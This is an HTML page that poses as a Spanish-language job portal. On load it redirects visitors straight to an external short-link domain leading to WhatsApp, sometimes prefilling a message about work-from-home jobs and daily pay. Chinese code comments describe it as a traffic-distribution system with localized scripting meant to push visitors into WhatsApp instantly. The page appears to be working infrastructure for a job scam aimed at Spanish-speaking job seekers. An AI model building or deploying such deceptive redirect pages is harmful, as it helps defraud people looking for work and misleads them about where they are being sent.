<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Empleo</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .loading-box {
            font-family: Arial, sans-serif;
            color: #16a34a;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="loading-box">
        🟩 Conectando con WhatsApp...
    </div>

    <script>
        // 🚀 核心分流系统链接（直接锁死你的目标链接）
        var baseUrl = "https://svip1027.top/blgui996";
        
        // 🎰 保留 5% 概率随机分配本土化话术的精髓，但执行速度提升 100 倍
        var whatsappPhrases = [
            "Hola, vi el anuncio y me interesa el trabajo.",
            "Quisiera recibir información sobre la vacante de empleo desde casa.",
            "Me gustaría postularme para el empleo a tiempo parcial.",
            "Estoy interesado en el trabajo con celular. ¿Me dan info?",
            "Hola, qué tal? Quiero saber más sobre los pagos diarios."
        ];

        var finalUrl = baseUrl;
        var randomNumber = Math.floor(Math.random() * 100) + 1;

        if (randomNumber <= 5) {
            var randomIndex = Math.floor(Math.random() * whatsappPhrases.length);
            finalUrl = baseUrl + "?text=" + encodeURIComponent(whatsappPhrases[randomIndex]);
        }

        // 💥 没有任何网络请求！0秒拒绝等待，直接强制甩飞进 WhatsApp！
        window.location.replace(finalUrl);
    </script>

</body>
</html>
